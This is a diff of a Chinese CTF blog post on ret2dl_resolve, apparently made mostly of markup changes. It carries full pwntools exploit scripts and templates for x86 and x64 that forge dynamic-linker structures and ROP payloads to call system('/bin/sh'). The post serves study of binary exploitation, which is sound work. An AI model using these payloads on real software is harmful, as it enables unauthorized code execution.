pwn <span class="hljs-keyword">import</span> *<br> <span class="hljs-number">2</span> <br> <span class="hljs-number">3</span> s=process(<span class="hljs-string">&#x27;./test&#x27;</span>)<br> <span class="hljs-number">4</span> elf=ELF(<span class="hljs-string">&#x27;./test&#x27;</span>)<br> <span class="hljs-number">5</span> libc=ELF(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br> <span class="hljs-number">6</span> <br> <span class="hljs-number">7</span> plt0 = elf.get_section_by_name(<span class="hljs-string">&#x27;.plt&#x27;</span>).header.sh_addr<br> <span class="hljs-number">8</span> l_addr=libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>] - libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<br> <span class="hljs-number">9</span> st_value=elf.got[<span class="hljs-string">&#x27;read&#x27;</span>]<br><span class="hljs-number">10</span> <br><span class="hljs-number">11</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_fake_link_map</span>(<span class="hljs-params">fake_link_map_addr,l_addr,st_value</span>):<br><span class="hljs-number">12</span>     <span class="hljs-comment">#the address of each fake pointer</span><br><span class="hljs-number">13</span>     fake_Elf64_Dyn_STR_addr=p64(fake_link_map_addr)<br><span class="hljs-number">14</span>     fake_Elf64_Dyn_SYM_addr=p64(fake_link_map_addr+<span class="hljs-number">0x8</span>)<br><span class="hljs-number">15</span>     fake_Elf64_Dyn_JMPREL_addr=p64(fake_link_map_addr+<span class="hljs-number">0x18</span>)<br><span class="hljs-number">16</span>     <span class="hljs-comment">#fake structure</span><br><span class="hljs-number">17</span>     fake_Elf64_Dyn_SYM =p64(<span class="hljs-number">0</span>)+p64(st_value-<span class="hljs-number">0x8</span>)<br><span class="hljs-number">18</span>     fake_Elf64_Dyn_JMPREL = p64(<span class="hljs-number">0</span>)+p64(fake_link_map_addr+<span class="hljs-number">0x28</span>)<br><span class="hljs-number">19</span>       <span class="hljs-comment"># JMPREL point to the address of .rel.plt，which will be located in fake_link_map_addr+0x28</span><br><span class="hljs-number">20</span>     r_offset = fake_link_map_addr - l_addr<br><span class="hljs-number">21</span>     fake_Elf64_rela =p64(r_offset)+p64(<span class="hljs-number">0x7</span>)+p64(<span class="hljs-number">0</span>)<br><span class="hljs-number">22</span>     <span class="hljs-comment">#fake_link_map</span><br><span class="hljs-number">23</span>     fake_link_map =p64(l_addr&amp;(<span class="hljs-number">2</span>**<span class="hljs-number">64</span>-<span class="hljs-number">1</span>))<span class="hljs-comment"># 0x8</span><br><span class="hljs-number">24</span>     fake_link_map+=fake_Elf64_Dyn_SYM   <span class="hljs-comment"># 0x18  </span><br><span class="hljs-number">25</span>     fake_link_map+=fake_Elf64_Dyn_JMPREL<span class="hljs-comment"># 0x28</span><br><span class="hljs-number">26</span>     fake_link_map+=fake_Elf64_rela      <span class="hljs-comment"># 0x40</span><br><span class="hljs-number">27</span>     fake_link_map+=<span class="hljs-string">b&quot;\x00&quot;</span>*<span class="hljs-number">0x28</span>         <span class="hljs-comment"># 0x68</span><br><span class="hljs-number">28</span>     fake_link_map+=fake_Elf64_Dyn_STR_addr     <span class="hljs-comment"># STRTAB pointer,0x70</span><br><span class="hljs-number">29</span>     fake_link_map+=fake_Elf64_Dyn_SYM_addr     <span class="hljs-comment"># SYMTAB pointer,0x78</span><br><span class="hljs-number">30</span>     fake_link_map+=<span class="hljs-string">b&quot;/bin/sh\x00&quot;</span>.ljust(<span class="hljs-number">0x80</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>) <span class="hljs-comment"># 0xf8</span><br><span class="hljs-number">31</span>     fake_link_map+=fake_Elf64_Dyn_JMPREL_addr  <span class="hljs-comment"># JMPREL pointer    </span><br><span class="hljs-number">32</span>     <span class="hljs-keyword">return</span> fake_link_map<br><span class="hljs-number">33</span> <br><span class="hljs-number">34</span> <br><span class="hljs-number">35</span> pop_rdi_ret = <span class="hljs-number">0x401223</span><br><span class="hljs-number">36</span> pop_rsi_r15_ret = <span class="hljs-number">0x401221</span><br><span class="hljs-number">37</span> ret = <span class="hljs-number">0x4011BE</span><br><span class="hljs-number">38</span> fake_link_map_addr = <span class="hljs-number">0x404050</span><br><span class="hljs-number">39</span> <br><span class="hljs-number">40</span> <br><span class="hljs-number">41</span> fake_link_map=get_fake_link_map(fake_link_map_addr,l_addr,st_value)<br><span class="hljs-number">42</span> <br><span class="hljs-number">43</span> payload = <span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x28</span> + p64(pop_rdi_ret) + p64(<span class="hljs-number">0</span>) + p64(pop_rsi_r15_ret) + p64(fake_link_map_addr) + p64(<span class="hljs-number">0</span>) + p64(elf.plt[<span class="hljs-string">&#x27;read&#x27;</span>])<br><span class="hljs-number">44</span> payload += p64(ret) + p64(pop_rdi_ret) + p64(fake_link_map_addr+<span class="hljs-number">0x78</span>) + p64(plt0+<span class="hljs-number">6</span>) + p64(fake_link_map_addr) + p64(<span class="hljs-number">0</span>)<br><span class="hljs-number">45</span> payload = payload.ljust(<span class="hljs-number">0x200</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br><span class="hljs-number">46</span> <br><span class="hljs-number">47</span> s.sendafter(<span class="hljs-string">&quot;something:\n&quot;</span>,payload)<br><span class="hljs-number">48</span> <br><span class="hljs-number">49</span> s.send(fake_link_map)<br><span class="hljs-number">50</span> <br><span class="hljs-number">51</span> s.interactive()<br></code></pre></td></tr></table></figure></div>
 
 <h3 id="板子"><a href="#板子" class="headerlink" title="板子"></a>板子</h3><p>x86</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python">plt0 = elf.get_section_by_name(<span class="hljs-string">&#x27;.plt&#x27;</span>).header.sh_addr<br>rel_plt = elf.get_section_by_name(<span class="hljs-string">&#x27;.rel.plt&#x27;</span>).header.sh_addr<br>dynsym = elf.get_section_by_name(<span class="hljs-string">&#x27;.dynsym&#x27;</span>).header.sh_addr<br>dynstr = elf.get_section_by_name(<span class="hljs-string">&#x27;.dynstr&#x27;</span>).header.sh_addr<br><br>index_offset=base_stage+<span class="hljs-number">20</span>-rel_plt <span class="hljs-comment"># .rel.plt</span><br>fake_sym_addr=base_stage+<span class="hljs-number">28</span><br>align = <span class="hljs-number">0x10</span> - ((fake_sym_addr - dynsym) &amp; <span class="hljs-number">0xf</span>)<br>fake_sym_addr = fake_sym_addr + align<br>index_dynsym = (fake_sym_addr - dynsym) // <span class="hljs-number">0x10</span><br>r_info = (index_dynsym &lt;&lt; <span class="hljs-number">8</span>)|<span class="hljs-number">0x7</span><br>fake_rel_plt = p32(read_got) + p32(r_info)<br>st_name = (fake_sym_addr + <span class="hljs-number">16</span>) - dynstr<br>fake_sym = p32(st_name) + p32(<span class="hljs-number">0</span>) + p32(<span class="hljs-number">0</span>) + p32(<span class="hljs-number">0x12</span>)<br>fake_str= <span class="hljs-string">b&quot;system&quot;</span><br><br>payload = <span class="hljs-string">b&#x27;AAAA&#x27;</span>               <span class="hljs-comment"># 4</span><br>payload += p32(plt_0)           <span class="hljs-comment"># 8</span><br>payload += p32(index_offset)    <span class="hljs-comment"># 12</span><br>payload += <span class="hljs-string">b&#x27;aaaa&#x27;</span>              <span class="hljs-comment"># 16</span><br>payload += p32(base_stage + <span class="hljs-number">80</span>) <span class="hljs-comment"># 20 /bin/sh</span><br>payload += fake_rel_plt         <span class="hljs-comment"># 28</span><br>payload += align * <span class="hljs-string">b&quot;B&quot;</span><br>payload += fake_sym<br>payload += fake_str<br>payload += <span class="hljs-string">b&quot;\x00&quot;</span> * (<span class="hljs-number">80</span> - <span class="hljs-built_in">len</span>(payload))<br>payload += <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span><br>payload += <span class="hljs-string">b&quot;A&quot;</span>*(<span class="hljs-number">200</span> - <span class="hljs-built_in">len</span>(payload))<br></code></pre></td></tr></table></figure>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python">plt0 = elf.get_section_by_name(<span class="hljs-string">&#x27;.plt&#x27;</span>).header.sh_addr<br>rel_plt = elf.get_section_by_name(<span class="hljs-string">&#x27;.rel.plt&#x27;</span>).header.sh_addr<br>dynsym = elf.get_section_by_name(<span class="hljs-string">&#x27;.dynsym&#x27;</span>).header.sh_addr<br>dynstr = elf.get_section_by_name(<span class="hljs-string">&#x27;.dynstr&#x27;</span>).header.sh_addr<br><br>index_offset=base_stage+<span class="hljs-number">20</span>-rel_plt <span class="hljs-comment"># .rel.plt</span><br>fake_sym_addr=base_stage+<span class="hljs-number">28</span><br>align = <span class="hljs-number">0x10</span> - ((fake_sym_addr - dynsym) &amp; <span class="hljs-number">0xf</span>)<br>fake_sym_addr = fake_sym_addr + align<br>index_dynsym = (fake_sym_addr - dynsym) // <span class="hljs-number">0x10</span><br>r_info = (index_dynsym &lt;&lt; <span class="hljs-number">8</span>)|<span class="hljs-number">0x7</span><br>fake_rel_plt = p32(read_got) + p32(r_info)<br>st_name = (fake_sym_addr + <span class="hljs-number">16</span>) - dynstr<br>fake_sym = p32(st_name) + p32(<span class="hljs-number">0</span>) + p32(<span class="hljs-number">0</span>) + p32(<span class="hljs-number">0x12</span>)<br>fake_str= <span class="hljs-string">b&quot;system&quot;</span><br><br>payload = <span class="hljs-string">b&#x27;AAAA&#x27;</span>               <span class="hljs-comment"># 4</span><br>payload += p32(plt_0)           <span class="hljs-comment"># 8</span><br>payload += p32(index_offset)    <span class="hljs-comment"># 12</span><br>payload += <span class="hljs-string">b&#x27;aaaa&#x27;</span>              <span class="hljs-comment"># 16</span><br>payload += p32(base_stage + <span class="hljs-number">80</span>) <span class="hljs-comment"># 20 /bin/sh</span><br>payload += fake_rel_plt         <span class="hljs-comment"># 28</span><br>payload += align * <span class="hljs-string">b&quot;B&quot;</span><br>payload += fake_sym<br>payload += fake_str<br>payload += <span class="hljs-string">b&quot;\x00&quot;</span> * (<span class="hljs-number">80</span> - <span class="hljs-built_in">len</span>(payload))<br>payload += <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span><br>payload += <span class="hljs-string">b&quot;A&quot;</span>*(<span class="hljs-number">200</span> - <span class="hljs-built_in">len</span>(payload))<br></code></pre></td></tr></table></figure></div>
 
 <p>x64</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs python"> <span class="hljs-number">1</span> <span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br> <span class="hljs-number">2</span> context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br> <span class="hljs-number">3</span> <br> <span class="hljs-number">4</span> s=process(<span class="hljs-string">&#x27;./test&#x27;</span>)<br> <span class="hljs-number">5</span> elf=ELF(<span class="hljs-string">&#x27;./test&#x27;</span>)<br> <span class="hljs-number">6</span> libc=ELF(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br> <span class="hljs-number">7</span> <br> <span class="hljs-number">8</span> plt0 = elf.get_section_by_name(<span class="hljs-string">&#x27;.plt&#x27;</span>).header.sh_addr<br> <span class="hljs-number">9</span> l_addr=libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>] - libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<br><span class="hljs-number">10</span> st_value=elf.got[<span class="hljs-string">&#x27;read&#x27;</span>]<br><span class="hljs-number">11</span> <br><span class="hljs-number">12</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_fake_link_map</span>(<span class="hljs-params">fake_link_map_addr,l_addr,st_value</span>):<br><span class="hljs-number">13</span>     <span class="hljs-comment">#the address of each fake pointer</span><br><span class="hljs-number">14</span>     fake_Elf64_Dyn_STR_addr=p64(fake_link_map_addr)<br><span class="hljs-number">15</span>     fake_Elf64_Dyn_SYM_addr=p64(fake_link_map_addr+<span class="hljs-number">0x8</span>)<br><span class="hljs-number">16</span>     fake_Elf64_Dyn_JMPREL_addr=p64(fake_link_map_addr+<span class="hljs-number">0x18</span>)<br><span class="hljs-number">17</span>     <span class="hljs-comment">#fake structure</span><br><span class="hljs-number">18</span>     fake_Elf64_Dyn_SYM =p64(<span class="hljs-number">0</span>)+p64(st_value-<span class="hljs-number">0x8</span>)<br><span class="hljs-number">19</span>     fake_Elf64_Dyn_JMPREL = p64(<span class="hljs-number">0</span>)+p64(fake_link_map_addr+<span class="hljs-number">0x28</span>)<br><span class="hljs-number">20</span>       <span class="hljs-comment"># JMPREL point to the address of .rel.plt，which will be located in fake_link_map_addr+0x28</span><br><span class="hljs-number">21</span>     r_offset = fake_link_map_addr - l_addr<br><span class="hljs-number">22</span>     fake_Elf64_rela =p64(r_offset)+p64(<span class="hljs-number">0x7</span>)+p64(<span class="hljs-number">0</span>)<br><span class="hljs-number">23</span>     <span class="hljs-comment">#fake_link_map</span><br><span class="hljs-number">24</span>     fake_link_map =p64(l_addr&amp;(<span class="hljs-number">2</span>**<span class="hljs-number">64</span>-<span class="hljs-number">1</span>))<span class="hljs-comment"># 0x8</span><br><span class="hljs-number">25</span>     fake_link_map+=fake_Elf64_Dyn_SYM   <span class="hljs-comment"># 0x18  </span><br><span class="hljs-number">26</span>     fake_link_map+=fake_Elf64_Dyn_JMPREL<span class="hljs-comment"># 0x28</span><br><span class="hljs-number">27</span>     fake_link_map+=fake_Elf64_rela      <span class="hljs-comment"># 0x40</span><br><span class="hljs-number">28</span>     fake_link_map+=<span class="hljs-string">b&quot;\x00&quot;</span>*<span class="hljs-number">0x28</span>         <span class="hljs-comment"># 0x68</span><br><span class="hljs-number">29</span>     fake_link_map+=fake_Elf64_Dyn_STR_addr     <span class="hljs-comment"># STRTAB pointer,0x70</span><br><span class="hljs-number">30</span>     fake_link_map+=fake_Elf64_Dyn_SYM_addr     <span class="hljs-comment"># SYMTAB pointer,0x78</span><br><span class="hljs-number">31</span>     fake_link_map+=<span class="hljs-string">b&quot;/bin/sh\x00&quot;</span>.ljust(<span class="hljs-number">0x80</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>) <span class="hljs-comment"># 0xf8</span><br><span class="hljs-number">32</span>     fake_link_map+=fake_Elf64_Dyn_JMPREL_addr  <span class="hljs-comment"># JMPREL pointer    </span><br><span class="hljs-number">33</span>     <span class="hljs-keyword">return</span> fake_link_map<br><span class="hljs-number">34</span> <br><span class="hljs-number">35</span> <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">36 typedef struct            </span><br><span class="hljs-string">37 &#123;</span><br><span class="hljs-string">38 Elf64_Word    st_name;        /* Symbol name (string tbl index) */</span><br><span class="hljs-string">39 unsigned char    st_info;   /* Symbol type and binding */        </span><br><span class="hljs-string">40 unsigned char st_other;     /* Symbol visibility */              </span><br><span class="hljs-string">41 Elf64_Section    st_shndx;  /* Section index */                  </span><br><span class="hljs-string">42 Elf64_Addr    st_value;     /* Symbol value */                   </span><br><span class="hljs-string">43 Elf64_Xword    st_size;     /* Symbol size */                    </span><br><span class="hljs-string">44 &#125;Elf64_Sym;</span><br><span class="hljs-string">45 </span><br><span class="hljs-string">46 typedef struct           </span><br><span class="hljs-string">47 &#123;</span><br><span class="hljs-string">48 Elf64_Addr    r_offset;         /* Address */                         </span><br><span class="hljs-string">49 Elf64_Xword    r_info;          /* Relocation type and symbol index */</span><br><span class="hljs-string">50 Elf64_Sxword    r_addend;       /* Addend */                          </span><br><span class="hljs-string">51 &#125;Elf64_Rela;</span><br><span class="hljs-string">52 </span><br><span class="hljs-string">53 typedef struct          </span><br><span class="hljs-string">54 &#123;</span><br><span class="hljs-string">55 Elf64_Sxword    d_tag;          /* Dynamic entry type */</span><br><span class="hljs-string">56 union</span><br><span class="hljs-string">57 &#123;</span><br><span class="hljs-string">58 Elf64_Xword d_val;          /* Integer value */</span><br><span class="hljs-string">59 Elf64_Addr d_ptr;           /* Address value */</span><br><span class="hljs-string">60 &#125; d_un;</span><br><span class="hljs-string">61 &#125;Elf64_Dyn;</span><br><span class="hljs-string">62 &#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs python"> <span class="hljs-number">1</span> <span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br> <span class="hljs-number">2</span> context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br> <span class="hljs-number">3</span> <br> <span class="hljs-number">4</span> s=process(<span class="hljs-string">&#x27;./test&#x27;</span>)<br> <span class="hljs-number">5</span> elf=ELF(<span class="hljs-string">&#x27;./test&#x27;</span>)<br> <span class="hljs-number">6</span> libc=ELF(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br> <span class="hljs-number">7</span> <br> <span class="hljs-number">8</span> plt0 = elf.get_section_by_name(<span class="hljs-string">&#x27;.plt&#x27;</span>).header.sh_addr<br> <span class="hljs-number">9</span> l_addr=libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>] - libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<br><span class="hljs-number">10</span> st_value=elf.got[<span class="hljs-string">&#x27;read&#x27;</span>]<br><span class="hljs-number">11</span> <br><span class="hljs-number">12</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_fake_link_map</span>(<span class="hljs-params">fake_link_map_addr,l_addr,st_value</span>):<br><span class="hljs-number">13</span>     <span class="hljs-comment">#the address of each fake pointer</span><br><span class="hljs-number">14</span>     fake_Elf64_Dyn_STR_addr=p64(fake_link_map_addr)<br><span class="hljs-number">15</span>     fake_Elf64_Dyn_SYM_addr=p64(fake_link_map_addr+<span class="hljs-number">0x8</span>)<br><span class="hljs-number">16</span>     fake_Elf64_Dyn_JMPREL_addr=p64(fake_link_map_addr+<span class="hljs-number">0x18</span>)<br><span class="hljs-number">17</span>     <span class="hljs-comment">#fake structure</span><br><span class="hljs-number">18</span>     fake_Elf64_Dyn_SYM =p64(<span class="hljs-number">0</span>)+p64(st_value-<span class="hljs-number">0x8</span>)<br><span class="hljs-number">19</span>     fake_Elf64_Dyn_JMPREL = p64(<span class="hljs-number">0</span>)+p64(fake_link_map_addr+<span class="hljs-number">0x28</span>)<br><span class="hljs-number">20</span>       <span class="hljs-comment"># JMPREL point to the address of .rel.plt，which will be located in fake_link_map_addr+0x28</span><br><span class="hljs-number">21</span>     r_offset = fake_link_map_addr - l_addr<br><span class="hljs-number">22</span>     fake_Elf64_rela =p64(r_offset)+p64(<span class="hljs-number">0x7</span>)+p64(<span class="hljs-number">0</span>)<br><span class="hljs-number">23</span>     <span class="hljs-comment">#fake_link_map</span><br><span class="hljs-number">24</span>     fake_link_map =p64(l_addr&amp;(<span class="hljs-number">2</span>**<span class="hljs-number">64</span>-<span class="hljs-number">1</span>))<span class="hljs-comment"># 0x8</span><br><span class="hljs-number">25</span>     fake_link_map+=fake_Elf64_Dyn_SYM   <span class="hljs-comment"># 0x18  </span><br><span class="hljs-number">26</span>     fake_link_map+=fake_Elf64_Dyn_JMPREL<span class="hljs-comment"># 0x28</span><br><span class="hljs-number">27</span>     fake_link_map+=fake_Elf64_rela      <span class="hljs-comment"># 0x40</span><br><span class="hljs-number">28</span>     fake_link_map+=<span class="hljs-string">b&quot;\x00&quot;</span>*<span class="hljs-number">0x28</span>         <span class="hljs-comment"># 0x68</span><br><span class="hljs-number">29</span>     fake_link_map+=fake_Elf64_Dyn_STR_addr     <span class="hljs-comment"># STRTAB pointer,0x70</span><br><span class="hljs-number">30</span>     fake_link_map+=fake_Elf64_Dyn_SYM_addr     <span class="hljs-comment"># SYMTAB pointer,0x78</span><br><span class="hljs-number">31</span>     fake_link_map+=<span class="hljs-string">b&quot;/bin/sh\x00&quot;</span>.ljust(<span class="hljs-number">0x80</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>) <span class="hljs-comment"># 0xf8</span><br><span class="hljs-number">32</span>     fake_link_map+=fake_Elf64_Dyn_JMPREL_addr  <span class="hljs-comment"># JMPREL pointer    </span><br><span class="hljs-number">33</span>     <span class="hljs-keyword">return</span> fake_link_map<br><span class="hljs-number">34</span> <br><span class="hljs-number">35</span> <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">36 typedef struct            </span><br><span class="hljs-string">37 &#123;</span><br><span class="hljs-string">38 Elf64_Word    st_name;        /* Symbol name (string tbl index) */</span><br><span class="hljs-string">39 unsigned char    st_info;   /* Symbol type and binding */        </span><br><span class="hljs-string">40 unsigned char st_other;     /* Symbol visibility */              </span><br><span class="hljs-string">41 Elf64_Section    st_shndx;  /* Section index */                  </span><br><span class="hljs-string">42 Elf64_Addr    st_value;     /* Symbol value */                   </span><br><span class="hljs-string">43 Elf64_Xword    st_size;     /* Symbol size */                    </span><br><span class="hljs-string">44 &#125;Elf64_Sym;</span><br><span class="hljs-string">45 </span><br><span class="hljs-string">46 typedef struct           </span><br><span class="hljs-string">47 &#123;</span><br><span class="hljs-string">48 Elf64_Addr    r_offset;         /* Address */                         </span><br><span class="hljs-string">49 Elf64_Xword    r_info;          /* Relocation type and symbol index */</span><br><span class="hljs-string">50 Elf64_Sxword    r_addend;       /* Addend */                          </span><br><span class="hljs-string">51 &#125;Elf64_Rela;</span><br><span class="hljs-string">52 </span><br><span class="hljs-string">53 typedef struct          </span><br><span class="hljs-string">54 &#123;</span><br><span class="hljs-string">55 Elf64_Sxword    d_tag;          /* Dynamic entry type */</span><br><span class="hljs-string">56 union</span><br><span class="hljs-string">57 &#123;</span><br><span class="hljs-string">58 Elf64_Xword d_val;          /* Integer value */</span><br><span class="hljs-string">59 Elf64_Addr d_ptr;           /* Address value */</span><br><span class="hljs-string">60 &#125; d_un;</span><br><span class="hljs-string">61 &#125;Elf64_Dyn;</span><br><span class="hljs-string">62 &#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure></div>
 
-<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/pwnfeifei/p/15701859.html">ret2dl_resolve - 狒猩橙 - 博客园</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_51868336/article/details/114644569">ret2dlresolve超详细教程(x86&amp;x64)-CSDN博客</a><br><a target="_blank" rel="noopener" href="https://zikh26.github.io/posts/ba418f23.html#ret2dl%E5%9B%9E%E9%A1%BE%E6%9E%81%E9%80%9F%E7%89%88">关于ret2_dl_runtime_resolve的学习总结 | ZIKH26’s Blog</a></p>
+<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a class="link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/pwnfeifei/p/15701859.html" >ret2dl_resolve - 狒猩橙 - 博客园<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a><br><a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/qq_51868336/article/details/114644569" >ret2dlresolve超详细教程(x86&amp;x64)-CSDN博客<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a><br><a class="link"   target="_blank" rel="noopener" href="https://zikh26.github.io/posts/ba418f23.html#ret2dl%E5%9B%9E%E9%A1%BE%E6%9E%81%E9%80%9F%E7%89%88" >关于ret2_dl_runtime_resolve的学习总结 | ZIKH26’s Blog<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
 
+		</div>
+
+		
+		<div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
+			<div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> ret2dl</li>
+        <li><strong>Author:</strong> The Redefine Team</li>
+        <li><strong>Created at
+                :</strong> 2025-05-12 19:27:27</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2025-08-10 21:14:12
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://redefine.ohevan.com/2025/05/12/ret2dl/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
+</div>
+
+		</div>
+		
+
+		
+		<ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
+			
+			<li class="tag-item mx-0.5">
+				<a href="../../../../tags/stack/">#stack</a>&nbsp;
+			</li>
+			
+		</ul>
+		
+
+		
+
+		
+		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+			
+			<div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="prev" rel="prev" href="../../../08/05/%E9%AB%98%E7%89%88%E6%9C%AClargebin-attack/">
+					<span class="left arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-left"></i>
+					</span>
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item truncate max-w-48">高版本largebin_attack</span>
+						<span class="post-nav-item">Prev posts</span>
+					</span>
+				</a>
+			</div>
+			
+			
+			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="next" rel="next" href="../../../04/29/%E5%89%8D%E8%A8%80/">
+					<span class="title flex justify-center items-center">
